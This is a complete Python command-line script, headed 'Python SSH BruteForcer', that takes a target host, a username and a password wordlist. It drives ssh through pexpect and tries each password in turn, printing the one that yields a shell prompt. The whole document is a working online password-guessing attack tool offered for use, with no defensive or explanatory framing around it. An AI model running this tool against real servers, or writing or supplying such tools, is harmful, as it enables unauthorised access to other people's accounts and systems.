#!/usr/bin/env python3

import pexpect 
from termcolor import colored
import optparse
import os
import sys

print('''
        ################################
        #     Python SSH BruteForcer   #
        #                              #
        #   Developed by Sheinn Khant  #
        ################################
        
        
     ''')

PROMPT = ['# ', '>>> ', '> ', '\$ ']

def connect(user, host, password):
    ssh_newkey = "Are you sure you want to continue connection"
    connStr = 'ssh ' + user + '@' + host
    child = pexpect.spawn(connStr)
    ret = child.expect([pexpect.TIMEOUT, ssh_newkey, '[P|p]assword: '])
    if ret == 0:
        print('[-] Error Connecting')
        return
    if ret == 1:
        child.sendline('yes')
        ret = child.expect([pexpect.TIMEOUT, '[P|p]assword: '])
        if ret == 0:
            print('[-] Error Connecting')
            return
    child.sendline(password)
    child.expect(PROMPT,timeout=0.5)
    return child


def main():
    parser = optparse.OptionParser("Usage: " +"python3 " + str(sys.argv[0]) + ' -H <hostname> -u <username> -w <wordlist>')
    parser.add_option('-H' ,dest='tgthost', type='string', help='Specify Target Host')
    parser.add_option('-u', dest='tgtusr', type='string' ,help='Specify Target Username')
    parser.add_option('-w' ,dest='wordlist' ,type='string',help='wordlist for bruteforce')
    (options, args) = parser.parse_args()

    host = options.tgthost
    user = options.tgtusr
    wordlist = options.wordlist

    if (host == None) | ( user== None ) | (wordlist == None):
        print(parser.usage)
        exit(0)
    
    try:
        file = open(wordlist, 'r')
        for password in file.readlines():
            password = password.strip('\n')
            try:
                child = connect(user, host, password)
                print(colored("[+] Password Found : " + password, 'green'))
                return password
            except:
                print(colored("[-] Wrong Password : " + password , 'red'))

    except:
        print("[!] File Doesn't Exist!")


main()
